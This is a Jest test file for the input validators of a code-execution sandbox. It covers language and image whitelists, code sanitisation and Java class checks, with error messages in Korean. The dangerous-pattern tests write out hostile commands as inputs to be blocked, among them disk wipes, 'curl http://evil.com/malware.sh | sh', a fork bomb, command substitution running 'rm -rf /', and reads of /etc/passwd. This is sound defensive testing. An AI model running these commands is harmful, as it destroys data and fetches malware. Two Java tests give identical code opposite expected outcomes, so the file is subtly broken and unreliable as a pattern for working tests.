import {
    validateLanguage,
    validateImage,
    sanitizeCode,
    validateJavaClass
} from '../../utils/validation';

describe('Validation Utilities', () => {
    describe('validateLanguage', () => {
        it('should accept valid lowercase languages', () => {
            const validLanguages = ['python', 'javascript', 'java', 'cpp', 'c', 'rust', 'go'];
            validLanguages.forEach(lang => {
                expect(validateLanguage(lang)).toBe(true);
            });
        });

        it('should accept valid mixed-case languages', () => {
            expect(validateLanguage('Python')).toBe(true);
            expect(validateLanguage('JavaScript')).toBe(true);
            expect(validateLanguage('JAVA')).toBe(true);
        });

        it('should reject invalid languages', () => {
            const invalidLanguages = ['invalid', 'cobol', 'fortran', ''];
            invalidLanguages.forEach(lang => {
                expect(validateLanguage(lang)).toBe(false);
            });
        });

        it('should reject non-string inputs', () => {
            expect(validateLanguage(123)).toBe(false);
            expect(validateLanguage(null)).toBe(false);
            expect(validateLanguage(undefined)).toBe(false);
            expect(validateLanguage({})).toBe(false);
            expect(validateLanguage([])).toBe(false);
        });

        it('should support all 17 backend languages', () => {
            const allLanguages = [
                'python', 'javascript', 'java', 'c', 'cpp', 'csharp',
                'go', 'rust', 'php', 'r', 'ruby', 'kotlin',
                'typescript', 'swift', 'perl', 'haskell', 'bash'
            ];
            allLanguages.forEach(lang => {
                expect(validateLanguage(lang)).toBe(true);
            });
        });

        it('should be case-insensitive', () => {
            expect(validateLanguage('PYTHON')).toBe(true);
            expect(validateLanguage('PyThOn')).toBe(true);
            expect(validateLanguage('rust')).toBe(true);
            expect(validateLanguage('RUST')).toBe(true);
        });
    });

    describe('validateImage', () => {
        it('should accept valid Docker images that are configured', () => {
            expect(validateImage('python:3.12-alpine')).toBeDefined();
            expect(validateImage('invalid-image')).toBe(false);
        });

        it('should reject invalid images', () => {
            const invalidImages = ['invalid-image', 'malicious:latest', ''];
            invalidImages.forEach(image => {
                expect(validateImage(image)).toBe(false);
            });
        });

        it('should reject non-string inputs', () => {
            expect(validateImage(123)).toBe(false);
            expect(validateImage(null)).toBe(false);
            expect(validateImage(undefined)).toBe(false);
            expect(validateImage({})).toBe(false);
        });
    });

    describe('sanitizeCode', () => {
        it('should accept valid code strings', () => {
            const validCode = 'print("Hello, World!")';
            expect(() => sanitizeCode(validCode)).not.toThrow();
        });

        it('should reject non-string code', () => {
            expect(() => sanitizeCode(123)).toThrow('코드는 문자열이어야 합니다.');
            expect(() => sanitizeCode(null)).toThrow('코드는 문자열이어야 합니다.');
            expect(() => sanitizeCode(undefined)).toThrow('코드는 문자열이어야 합니다.');
            expect(() => sanitizeCode({})).toThrow('코드는 문자열이어야 합니다.');
        });

        it('should reject code that is too long', () => {
            const longCode = 'a'.repeat(100001);
            expect(() => sanitizeCode(longCode)).toThrow('코드가 너무 깁니다.');
        });

        it('should accept code up to max length', () => {
            const maxLengthCode = 'a'.repeat(100000);
            expect(() => sanitizeCode(maxLengthCode)).not.toThrow();
        });

        it('should reject empty or whitespace-only code', () => {
            expect(() => sanitizeCode('')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('   ')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('\n\n')).toThrow('코드는 비어있을 수 없습니다.');
            expect(() => sanitizeCode('\t\t')).toThrow('코드는 비어있을 수 없습니다.');
        });

        describe('Security - Dangerous Pattern Detection', () => {
            it('should reject destructive file system commands', () => {
                expect(() => sanitizeCode('rm -rf /')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('mkfs.ext4 /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('dd if=/dev/zero of=/dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('wipefs -a /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('fdisk /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('del /f important.txt')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject container commands', () => {
                expect(() => sanitizeCode('docker run -it ubuntu')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject privilege escalation commands', () => {
                expect(() => sanitizeCode('sudo apt-get install')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject system service commands', () => {
                expect(() => sanitizeCode('systemctl stop firewalld')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('shutdown -h now')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('reboot')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject network tools', () => {
                expect(() => sanitizeCode('nmap -sS 192.168.1.1')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('nc -l -p 8080')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject permission changes', () => {
                expect(() => sanitizeCode('chmod 777 /etc/passwd')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('chown root:root /etc/shadow')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject user/group manipulation', () => {
                expect(() => sanitizeCode('useradd hacker')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('passwd root')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject SSH commands', () => {
                expect(() => sanitizeCode('ssh-keygen -t rsa')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject crontab manipulation', () => {
                expect(() => sanitizeCode('crontab -e')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject access to sensitive files', () => {
                expect(() => sanitizeCode('cat /etc/passwd')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('ls /root/')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject device access', () => {
                expect(() => sanitizeCode('cat /dev/sda')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject kernel module commands', () => {
                expect(() => sanitizeCode('modprobe malicious')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject shell injection patterns', () => {
                expect(() => sanitizeCode('bash -i test')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('curl http://evil.com/malware.sh | sh')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode(':(){ :|: & };:')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject command substitution', () => {
                expect(() => sanitizeCode('`whoami`')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
                expect(() => sanitizeCode('$(rm -rf /)')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject mount commands', () => {
                expect(() => sanitizeCode('mount /dev/sdb1 /mnt')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });

            it('should reject sys filesystem access', () => {
                expect(() => sanitizeCode('cat /sys/class/net/eth0/address')).toThrow('코드에 위험한 패턴이 포함되어 있습니다.');
            });
        });

        it('should accept safe code without dangerous patterns', () => {
            const safeCodes = [
                'print("Hello, World!")',
                'function add(a, b) { return a + b; }',
                'public class Main { public static void main(String[] args) {} }',
                'for (int i = 0; i < 10; i++) { printf("%d", i); }',
                'let result = numbers.map(x => x * 2);',
                'const message = "This is safe code";'
            ];
            safeCodes.forEach(code => {
                expect(() => sanitizeCode(code)).not.toThrow();
            });
        });
    });

    describe('validateJavaClass', () => {
        it('should accept valid Java code with public class', () => {
            const validJavaCode = `
public class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello, World!");
    }
}`;
            expect(() => validateJavaClass(validJavaCode)).not.toThrow();
        });

        it('should accept Java code with multiple classes', () => {
            const validJavaCode = `
class Helper {
    void help() {}
}

public class Main {
    public static void main(String[] args) {
        System.out.println("Hello");
    }
}`;
            expect(() => validateJavaClass(validJavaCode)).not.toThrow();
        });

        it('should reject Java code without public class', () => {
            const invalidJavaCode = `
class Main {
    void run() {
        System.out.println("Hello");
    }
}`;
            expect(() => validateJavaClass(invalidJavaCode)).toThrow('Java 코드는 public class를 포함해야 합니다.');
        });

        it('should reject non-string input', () => {
            expect(() => validateJavaClass(123 as any)).toThrow('잘못된 코드 형식입니다.');
            expect(() => validateJavaClass(null as any)).toThrow('잘못된 코드 형식입니다.');
            expect(() => validateJavaClass(undefined as any)).toThrow('잘못된 코드 형식입니다.');
        });

        it('should validate class name matches file name comment', () => {
            const mismatchedCode = `
public class Main {
    public static void main(String[] args) {}
}`;
            expect(() => validateJavaClass(mismatchedCode)).toThrow('클래스 이름은 파일 이름과 일치해야 합니다.');
        });

        it('should accept matching class and file names', () => {
            const matchedCode = `
public class Main {
    public static void main(String[] args) {}
}`;
            expect(() => validateJavaClass(matchedCode)).not.toThrow();
        });

        it('should handle Java code without file comment', () => {
            const codeWithoutComment = `
public class TestClass {
    public static void main(String[] args) {
        System.out.println("Test");
    }
}`;
            expect(() => validateJavaClass(codeWithoutComment)).not.toThrow();
        });

        it('should handle whitespace variations in class declaration', () => {
            const variations = [
                'public  class   SpacedClass{}',
                'public\tclass\tTabClass{}',
                'public\nclass\nNewlineClass{}'
            ];
            variations.forEach(code => {
                expect(() => validateJavaClass(code)).not.toThrow();
            });
        });
    });
});
